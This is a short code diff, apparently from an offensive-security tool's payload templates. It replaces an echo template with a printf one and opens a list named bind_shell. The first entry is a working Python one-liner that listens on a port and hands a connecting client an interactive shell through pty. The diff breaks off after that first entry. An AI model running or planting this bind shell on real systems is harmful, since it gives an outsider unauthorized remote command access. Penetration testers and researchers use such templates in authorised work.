@@ -1,5 +1,5 @@
 
-echo = """echo '%(s1)s'"""
+printf = """printf '%(s1)s'"""
 
 bind_shell = [
     """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("%(shell)s");s.close()'""",
